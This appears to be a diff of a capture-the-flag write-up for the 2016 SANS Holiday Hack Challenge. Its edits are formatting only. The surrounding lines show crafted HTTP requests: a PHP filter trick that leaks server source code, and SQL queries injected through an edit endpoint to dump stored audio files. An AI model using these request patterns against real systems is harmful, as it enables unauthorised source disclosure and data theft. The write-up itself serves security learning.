@@ -4,7 +4,7 @@ title: 2016 SANS Holiday Hack Challenge - Writeup
 draft: false
 ---
 
-This Christmas I took part in [SANS Holiday Hack Challenge](https://www.holidayhackchallenge.com/2016/index.html) - and had a blast! :) What a fun ride it was. Modeled as a retro computer game it had security challenges masterfully woven into the script, making for an entertaining experience that also teaches important lessons about various security vulnerabilities. 
+This Christmas I took part in [SANS Holiday Hack Challenge](https://www.holidayhackchallenge.com/2016/index.html) - and had a blast! :smile: What a fun ride it was. Modeled as a retro computer game it had security challenges masterfully woven into the script, making for an entertaining experience that also teaches important lessons about various security vulnerabilities. 
 
 I especially liked that for me the challenge achieved the [Goldilocks factor](https://en.wikipedia.org/wiki/Goldilocks_principle) - puzzles were not too easy (so that they remained challenging and interesting), and not too hard (so that you are not banging your head against the wall, frustrated).
 
@@ -366,7 +366,7 @@ After sending the e-mail we get file ```discombobulatedaudio3.mp3``` back.
 
 Code analysis shows that a special setting needs to be turned on in the APK for the Debug server requests to be sent:
 
-```XML
+```xml
 <string name="debug_data_enabled">true</string>
 ```
 
@@ -376,7 +376,7 @@ Next, we set up an intercepting proxy on the Android phone and see what requests
 
 Here's is one captured example:
 
-```
+```http
 POST /index.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
@@ -398,7 +398,7 @@ Server: nginx/1.6.2
 
 Notice that there is a new parameter returned in the sample above - ```"verbose":false```. Let's modify the request, adding ```"verbose":true``` and re-send it:
  
-```
+```http
 POST /index.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
@@ -432,7 +432,7 @@ After clicking around for a bit and executing console commands to examine the ob
 
 As we explore the Exception server we try a number of JSON payloads and get some information in the process:
 
-```
+```http
 POST /exception.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
@@ -489,7 +489,7 @@ Server: nginx/1.10.2
 
 Given that the data is written into a PHP file let's try the filter exploit:
 
-```
+```http
 POST /exception.php HTTP/1.1
 Content-Type: application/json
 User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9505 Build/KOT49H)
@@ -512,7 +512,7 @@ PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bG...
 
 When we Base64-decode the response we get the source of ```exception.php```, that includes the following string:
 
-```
+```php
 <?php # Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3 
 ```
 
@@ -579,8 +579,8 @@ Now let's try to retrieve the saved MP3. The site allows saving of queries. We s
 
 We can do that in an intercepting proxy:
 
-```
-GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select * from audio HTTP/1.1
+```http
+GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select%20*%20from%20audio HTTP/1.1
 Host: analytics.northpolewonderland.com
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -596,8 +596,8 @@ Next we execute the saved query using View functionality:
 
 Note that we now see what MP3 files are in the database. But we cannot quite get the files yet because they are blobs. So let's modify the query to Base64-encode them:
 
-```
-GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select to_base64(mp3) from audio HTTP/1.1
+```http
+GET /edit.php?id=6df741a8-c1b7-42ea-bd51-97ba7afa4d94&name=d&description=d&query=select%20to_base64(mp3)%20from%20audio HTTP/1.1
 Host: analytics.northpolewonderland.com
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
